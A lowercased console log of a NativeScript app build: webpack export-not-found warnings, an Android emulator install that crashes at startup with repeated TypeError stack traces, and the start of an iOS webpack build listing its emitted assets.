"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 835:100-105
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 846:102-107
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 857:108-113
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 868:106-111
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 922:63-68
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 932:59-64
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 943:61-66
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 953:63-68
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 999:96-101
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 165:87-92
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/dialogs/dialogs-common.ts 92:12-17
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/dialogs/dialogs.ts @ /users/mdonev/github/nativescript/tns-core-modules/globals/globals.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/dialogs/dialogs-common.ts 108:12-17
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/dialogs/dialogs.ts @ /users/mdonev/github/nativescript/tns-core-modules/globals/globals.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/dialogs/dialogs-common.ts 122:12-17
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/dialogs/dialogs.ts @ /users/mdonev/github/nativescript/tns-core-modules/globals/globals.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 187:12-17
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 228:91-96
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts
webpack compilation complete
watching for file changes.
webpack build done!
copying template files...
platform android successfully added
preparing project...
project successfully prepared (android)
building project...
gradle build..
+ setting applicationid + applying user-defined configuration from /users/mdonev/github/dev-test/app/app_resources/android/app.gradle + using support library version 28.0.0 + adding nativescript runtime package dependency: nativescript-optimized-with-inspector + adding aar plugin dependency: /users/mdonev/github/dev-test/node_modules/tns-core-modules/node_modules/tns-core-modules-widgets/platforms/android/widgets-release.aar
note: some input files use or override a deprecated api.
note: recompile with -xlint:deprecation for details.
project successfully built.
installing on device emulator-5554...
successfully installed on device with identifier 'emulator-5554'.
restarting application on device emulator-5554...
successfully synced application org.nativescript.devtest on device emulator-5554.
system.err: java.lang.runtimeexception: unable to create application com.tns.nativescriptapplication: com.tns.nativescriptexception:
system.err:
system.err: error calling module function
system.err:
system.err: error calling module function
system.err:
system.err: typeerror: cannot read property 'on' of undefined
system.err: file: " line: 42895, column: 53
system.err:
system.err: stacktrace:
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/background.ts', file:' line: 42895, column: 54
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-properties.ts', file:' line: 44199, column: 80
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/core/view-base/view-base.ts', file:' line: 17915, column: 83
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'', file:' line: 45229, column: 73
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-scope.ts', file:' line: 45985, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css.js.module.exports', file:' line: 320, column: 5
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css-regular.js.module.exports', file:' line: 305, column: 5
system.err: frame: function:'', file:' line: 53866, column: 108
system.err: frame: function:'./app.ts', file:' line: 53913, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'checkdeferredmodules', file:' line: 44, column: 23
system.err: frame: function:'webpackjsonpcallback', file:' line: 31, column: 19
system.err: frame: function:'', file:' line: 2, column: 57
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err: frame: function:'', file:' line: 3, column: 1
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err:
system.err:
system.err: typeerror: cannot read property 'on' of undefined
system.err: file: "<unknown>, line: 1, column: 265
system.err:
system.err: stacktrace:
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/background.ts', file:' line: 42895, column: 54
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-properties.ts', file:' line: 44199, column: 80
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/core/view-base/view-base.ts', file:' line: 17915, column: 83
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'', file:' line: 45229, column: 73
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-scope.ts', file:' line: 45985, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css.js.module.exports', file:' line: 320, column: 5
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css-regular.js.module.exports', file:' line: 305, column: 5
system.err: frame: function:'', file:' line: 53866, column: 108
system.err: frame: function:'./app.ts', file:' line: 53913, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'checkdeferredmodules', file:' line: 44, column: 23
system.err: frame: function:'webpackjsonpcallback', file:' line: 31, column: 19
system.err: frame: function:'', file:' line: 2, column: 57
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err: frame: function:'', file:' line: 3, column: 1
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err:
system.err:
system.err: typeerror: cannot read property 'on' of undefined
system.err: file: "<unknown>, line: 1, column: 265
system.err:
system.err: stacktrace:
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/background.ts', file:' line: 42895, column: 54
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-properties.ts', file:' line: 44199, column: 80
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/core/view-base/view-base.ts', file:' line: 17915, column: 83
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'', file:' line: 45229, column: 73
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-scope.ts', file:' line: 45985, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css.js.module.exports', file:' line: 320, column: 5
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css-regular.js.module.exports', file:' line: 305, column: 5
system.err: frame: function:'', file:' line: 53866, column: 108
system.err: frame: function:'./app.ts', file:' line: 53913, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'checkdeferredmodules', file:' line: 44, column: 23
system.err: frame: function:'webpackjsonpcallback', file:' line: 31, column: 19
system.err: frame: function:'', file:' line: 2, column: 57
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err: frame: function:'', file:' line: 3, column: 1
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err:
system.err: at android.app.activitythread.handlebindapplication(activitythread.java:5876)
system.err: at android.app.activitythread.access$1100(activitythread.java:199)
system.err: at android.app.activitythread$h.handlemessage(activitythread.java:1650)
system.err: at android.os.handler.dispatchmessage(handler.java:106)
system.err: at android.os.looper.loop(looper.java:193)
system.err: at android.app.activitythread.main(activitythread.java:6669)
system.err: at java.lang.reflect.method.invoke(native method)
system.err: at com.android.internal.os.runtimeinit$methodandargscaller.run(runtimeinit.java:493)
system.err: at com.android.internal.os.zygoteinit.main(zygoteinit.java:858)
system.err: caused by: com.tns.nativescriptexception:
system.err:
system.err: error calling module function
system.err:
system.err: error calling module function
system.err:
system.err: typeerror: cannot read property 'on' of undefined
system.err: file: " line: 42895, column: 53
system.err:
system.err: stacktrace:
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/background.ts', file:' line: 42895, column: 54
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-properties.ts', file:' line: 44199, column: 80
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/core/view-base/view-base.ts', file:' line: 17915, column: 83
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'', file:' line: 45229, column: 73
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-scope.ts', file:' line: 45985, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css.js.module.exports', file:' line: 320, column: 5
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css-regular.js.module.exports', file:' line: 305, column: 5
system.err: frame: function:'', file:' line: 53866, column: 108
system.err: frame: function:'./app.ts', file:' line: 53913, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'checkdeferredmodules', file:' line: 44, column: 23
system.err: frame: function:'webpackjsonpcallback', file:' line: 31, column: 19
system.err: frame: function:'', file:' line: 2, column: 57
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err: frame: function:'', file:' line: 3, column: 1
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err:
system.err:
system.err: typeerror: cannot read property 'on' of undefined
system.err: file: "<unknown>, line: 1, column: 265
system.err:
system.err: stacktrace:
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/background.ts', file:' line: 42895, column: 54
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-properties.ts', file:' line: 44199, column: 80
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/core/view-base/view-base.ts', file:' line: 17915, column: 83
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'', file:' line: 45229, column: 73
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-scope.ts', file:' line: 45985, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css.js.module.exports', file:' line: 320, column: 5
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css-regular.js.module.exports', file:' line: 305, column: 5
system.err: frame: function:'', file:' line: 53866, column: 108
system.err: frame: function:'./app.ts', file:' line: 53913, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'checkdeferredmodules', file:' line: 44, column: 23
system.err: frame: function:'webpackjsonpcallback', file:' line: 31, column: 19
system.err: frame: function:'', file:' line: 2, column: 57
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err: frame: function:'', file:' line: 3, column: 1
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err:
system.err:
system.err: typeerror: cannot read property 'on' of undefined
system.err: file: "<unknown>, line: 1, column: 265
system.err:
system.err: stacktrace:
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/background.ts', file:' line: 42895, column: 54
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-properties.ts', file:' line: 44199, column: 80
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'../../nativescript/tns-core-modules/ui/core/view-base/view-base.ts', file:' line: 17915, column: 83
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'', file:' line: 45229, column: 73
system.err: frame: function:'../../nativescript/tns-core-modules/ui/styling/style-scope.ts', file:' line: 45985, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'fn', file:' line: 121, column: 20
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css.js.module.exports', file:' line: 320, column: 5
system.err: frame: function:'push.../node_modules/nativescript-dev-webpack/load-application-css-regular.js.module.exports', file:' line: 305, column: 5
system.err: frame: function:'', file:' line: 53866, column: 108
system.err: frame: function:'./app.ts', file:' line: 53913, column: 30
system.err: frame: function:'__webpack_require__', file:' line: 751, column: 30
system.err: frame: function:'checkdeferredmodules', file:' line: 44, column: 23
system.err: frame: function:'webpackjsonpcallback', file:' line: 31, column: 19
system.err: frame: function:'', file:' line: 2, column: 57
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err: frame: function:'', file:' line: 3, column: 1
system.err: frame: function:'require', file:'', line: 1, column: 266
system.err:
system.err: at com.tns.runtime.runmodule(native method)
system.err: at com.tns.runtime.runmodule(runtime.java:624)
system.err: at com.tns.runtime.run(runtime.java:616)
system.err: at com.tns.nativescriptapplication.oncreate(nativescriptapplication.java:21)
system.err: at android.app.instrumentation.callapplicationoncreate(instrumentation.java:1154)
system.err: at android.app.activitythread.handlebindapplication(activitythread.java:5871)
system.err: ..
tns run ios
skipping node_modules folder! use the syncallfiles option to sync files from this folder.
searching for devices...
running webpack for ios...
clean-webpack-plugin: /users/mdonev/github/dev-test/platforms/ios/devtest/app/**/* has been removed.
file change detected
starting incremental webpack compilation...
starting type checking service...
using 1 worker with 2048mb memory limit webpack is watching the files no type errors found
version: typescript 3.1.6
time: 5421ms
hash: 8c21c922bf63e9c6da73
version: webpack 4.27.1
time: 10266ms
built at: 2019-05-22 16:25:09 asset size chunks chunk names app_resources/ios/assets.xcassets/appicon.appiconset/contents.json 2.31 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-1024.png 98.7 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-20.png 1.2 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-20@2x.png 3.61 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-20@3x.png 6.68 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-29.png 1.64 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-29@2x.png 4.73 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-29@3x.png 9.24 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-40.png 2.6 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-40@2x.png 7.59 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-40@3x.png 14.7 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-60@2x.png 14.7 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-60@3x.png 31.4 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-76.png 7.24 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-76@2x.png 22.3 kib [emitted] app_resources/ios/assets.xcassets/appicon.appiconset/icon-83.5@2x.png 27.6 kib [emitted] app_resources/ios/assets.xcassets/contents.json 62 bytes [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/contents.json 5.1 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-1125h.png 160 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-568h@2x.png 62.2 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-667h@2x.png 112 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-736h@3x.png 180 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-landscape-x.png 165 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-landscape-xr.png 43.2 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-landscape-xs-max.png 71.5 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-landscape.png 60.9 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-landscape@2x.png 187 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-landscape@3x.png 198 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-portrait-xr.png 43.4 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-portrait-xs-max.png 72.7 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-portrait.png 59.5 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default-portrait@2x.png 182 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default.png 20.3 kib [emitted] app_resources/ios/assets.xcassets/launchimage.launchimage/default@2x.png 61.4 kib [emitted] app_resources/ios/assets.xcassets/launchscreen.aspectfill.imageset/contents.json 426 bytes [emitted] app_resources/ios/assets.xcassets/launchscreen.aspectfill.imageset/launchscreen-aspectfill.png 1.67 kib [emitted]
app_resources/ios/assets.xcassets/launchscreen.aspectfill.imageset/launchscreen-aspectfill@2x.png 3.9 kib [emitted]
app_resources/ios/assets.xcassets/launchscreen.aspectfill.imageset/launchscreen-aspectfill@3x.png 34.4 kib [emitted] app_resources/ios/assets.xcassets/launchscreen.center.imageset/contents.json 414 bytes [emitted] app_resources/ios/assets.xcassets/launchscreen.center.imageset/launchscreen-center.png 65.3 kib [emitted] app_resources/ios/assets.xcassets/launchscreen.center.imageset/launchscreen-center@2x.png 202 kib [emitted] app_resources/ios/assets.xcassets/launchscreen.center.imageset/launchscreen-center@3x.png 91.9 kib [emitted] app_resources/ios/info.plist 1.44 kib [emitted] app_resources/ios/launchscreen.storyboard 4.04 kib [emitted] app_resources/ios/build.xcconfig 381 bytes [emitted] bundle.js 3.16 mib bundle [emitted] bundle package.json 82 bytes [emitted] runtime.js 29.8 kib runtime [emitted] runtime starter.js 60 bytes [emitted] tns_modules/tns-core-modules/inspector_modules.js 1.52 mib tns_modules/tns-core-modules/inspector_modules [emitted] tns_modules/tns-core-modules/inspector_modules vendor.js 35 kib vendor [emitted] vendor
entrypoint bundle = runtime.js vendor.js bundle.js
entrypoint tns_modules/tns-core-modules/inspector_modules = runtime.js vendor.js tns_modules/tns-core-modules/inspector_modules.js
[../../nativescript/tns-core-modules/application/application-common.ts] /users/mdonev/github/nativescript/tns-core-modules/application/application-common.ts 3.5 kib {bundle} {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/application/application.ts] /users/mdonev/github/nativescript/tns-core-modules/application/application.ts 15.2 kib {bundle} {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/bundle-entry-points.ts] /users/mdonev/github/nativescript/tns-core-modules/bundle-entry-points.ts 3.46 kib {bundle} [built]
[../../nativescript/tns-core-modules/debugger/inspectorbackendcommands.ts] /users/mdonev/github/nativescript/tns-core-modules/debugger/inspectorbackendcommands.ts 26.7 kib {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/debugger/debugger.ts] /users/mdonev/github/nativescript/tns-core-modules/debugger/debugger.ts 3.93 kib {bundle} {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/debugger/devtools-elements.ts] /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts 894 bytes {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/debugger/webinspector-css.ts] /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-css.ts 3.01 kib {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/debugger/webinspector-dom.ts] /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts 2.92 kib {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/debugger/webinspector-network.ts] /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-network.ts 8.79 kib {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/globals/globals.ts] /users/mdonev/github/nativescript/tns-core-modules/globals/globals.ts 8.08 kib {bundle} {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/globals/ts-helpers.ts] /users/mdonev/github/nativescript/tns-core-modules/globals/ts-helpers.ts 867 bytes {bundle} {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/inspector_modules.js] /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js 303 bytes {tns_modules/tns-core-modules/inspector_modules} [built]
[../../nativescript/tns-core-modules/profiling/profiling.ts] /users/mdonev/github/nativescript/tns-core-modules/profiling/profiling.ts 8.75 kib {bundle} {tns_modules/tns-core-modules/inspector_modules} [built]
[./ sync recursive (root|page)\\.(xml|css|js|ts|scss)$]
sync (root|page)\\.(xml|css|js|ts|scss)$ 228 bytes {bundle} [built]
[./app.ts] 1.45 kib {bundle} [built] + 156 hidden modules warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 256:61-75
"export \'backstackentry\' was not found in \'.\' @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 256:95-109
"export \'backstackentry\' was not found in \'.\' @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/ui/builder/builder.ts 657:64-79
"export \'componentmodule\' was not found in \'./component-builder\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/ui/builder/builder.ts 657:99-114
"export \'componentmodule\' was not found in \'./component-builder\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/ui/core/bindable/bindable.ts 10:0-173
